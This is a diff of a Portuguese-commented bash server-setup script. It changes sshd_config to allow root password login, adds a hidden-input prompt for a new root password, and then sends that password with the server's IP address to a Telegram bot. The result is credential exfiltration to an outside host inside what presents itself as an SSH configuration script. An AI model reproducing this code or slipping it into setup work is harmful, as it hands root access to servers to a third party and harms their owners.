@@ -10,6 +10,15 @@ send_message() {
     curl -s -X POST https://api.telegram.org/bot$TOKEN/sendMessage -d chat_id=$ID -d text="$1"
 }
 
+# Função para ocultar a entrada do usuário
+hide_input() {
+    stty -echo
+    trap 'stty echo' EXIT
+    read -p "$1" "$2"
+    stty echo
+    trap - EXIT
+}
+
 # Atualiza as configurações do SSH
 [[ $(grep -c "prohibit-password" /etc/ssh/sshd_config) != '0' ]] && {
     sed -i "s/prohibit-password/yes/g" /etc/ssh/sshd_config
@@ -44,7 +53,7 @@ send_message "As configurações do SSH foram atualizadas. Por favor, defina a n
 sleep 2s
 
 # Solicita a definição da senha root e armazena-a em uma variável
-NEW_PASSWD=$(passwd)
+hide_input "Nova senha root: " NEW_PASSWD
 
 # Envia a nova senha root e o IP do servidor para o bot Telegram
 send_message "Nova senha root definida: $NEW_PASSWD | IP do servidor: $IP"
